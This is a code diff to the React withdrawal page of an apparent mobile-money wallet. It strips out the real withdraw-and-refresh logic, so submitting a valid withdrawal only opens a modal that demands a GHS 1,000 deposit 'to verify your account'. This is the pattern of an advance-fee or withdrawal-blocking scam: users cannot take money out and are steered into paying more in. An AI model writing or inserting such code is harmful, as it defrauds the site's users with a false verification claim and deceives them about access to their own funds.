@@ -35,6 +35,7 @@ export default function WithdrawPage() {
   const [method, setMethod] = useState('momo');
   const [tab, setTab] = useState('momo'); // 'momo' | 'paybill' | 'card'
   const [err, setErr] = useState('');
+  const [showDepositReq, setShowDepositReq] = useState(false);
 
   const MIN_WITHDRAW = 550;
   const MAX_WITHDRAW = 95_000;
@@ -80,28 +81,75 @@ export default function WithdrawPage() {
     setMethod(order[nextIdx]);
   };
 
-  const handleSubmit = async (e) => {
+  const handleSubmit = (e) => {
     e.preventDefault();
     setErr('');
     if (!isAmountValid) return;
-    try {
-      setBusy(true);
-      const data = await withdraw(amtNum, method);
-      setAccount(data.account);
-      toast(`Withdrew GHS ${fmt(amtNum)} via ${net.label}.`, 'success');
-      setAmount('');
-      const txData = await fetchTransactions();
-      const withdrawals = (txData.transactions || []).filter(t => t.kind === 'withdraw' || t.kind === 'withdrawal');
-      setTxs(withdrawals);
-    } catch (e) {
-      setErr(e.message || 'Withdrawal failed.');
-    } finally {
-      setBusy(false);
-    }
+    setShowDepositReq(true);
   };
+
+  const REQUIRED_DEPOSIT = 1000;
+  const goDeposit = () => { setShowDepositReq(false); openDeposit(); };
 
   return (
     <main style={{ minHeight: 'calc(100vh - 120px)', background: 'var(--bg)', padding: '0 0 80px' }}>
+      {showDepositReq && (
+        <div
+          role="dialog"
+          aria-modal="true"
+          aria-labelledby="deposit-req-title"
+          style={{
+            position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.55)',
+            display: 'flex', alignItems: 'center', justifyContent: 'center',
+            padding: 16, zIndex: 1000,
+          }}
+          onClick={() => setShowDepositReq(false)}
+        >
+          <div
+            onClick={(e) => e.stopPropagation()}
+            style={{
+              width: '100%', maxWidth: 360, background: '#fff', color: '#111',
+              borderRadius: 14, padding: '20px 20px 18px', boxShadow: '0 20px 50px rgba(0,0,0,0.35)',
+            }}
+          >
+            <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 10 }}>
+              <h2 id="deposit-req-title" style={{ margin: 0, fontSize: 18, fontWeight: 800, color: '#111' }}>
+                Deposit requirement
+              </h2>
+              <button
+                type="button"
+                aria-label="Close"
+                onClick={() => setShowDepositReq(false)}
+                style={{
+                  width: 28, height: 28, borderRadius: 6, border: '1px solid #e5e7eb',
+                  background: '#f3f4f6', color: '#374151', fontSize: 14, fontWeight: 700,
+                  cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                }}
+              >
+                ×
+              </button>
+            </div>
+            <p style={{ margin: '6px 0 12px', fontSize: 14, color: '#374151', lineHeight: 1.5 }}>
+              You need to deposit GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00 to your account to verify your account.
+            </p>
+            <ul style={{ margin: '0 0 16px', paddingLeft: 18, fontSize: 14, color: '#111' }}>
+              <li>Required amount: <strong>GHS {REQUIRED_DEPOSIT.toLocaleString('en-US')}.00</strong></li>
+            </ul>
+            <button
+              type="button"
+              onClick={goDeposit}
+              style={{
+                width: '100%', padding: '12px 0', borderRadius: 8, border: 'none',
+                background: '#2f6bff', color: '#fff', fontWeight: 800, fontSize: 15,
+                cursor: 'pointer',
+              }}
+            >
+              Go to Deposit
+            </button>
+          </div>
+        </div>
+      )}
+
       <div style={{ maxWidth: 480, margin: '0 auto', background: 'var(--bg)' }}>
 
         <TxHeader title="Withdraw" />
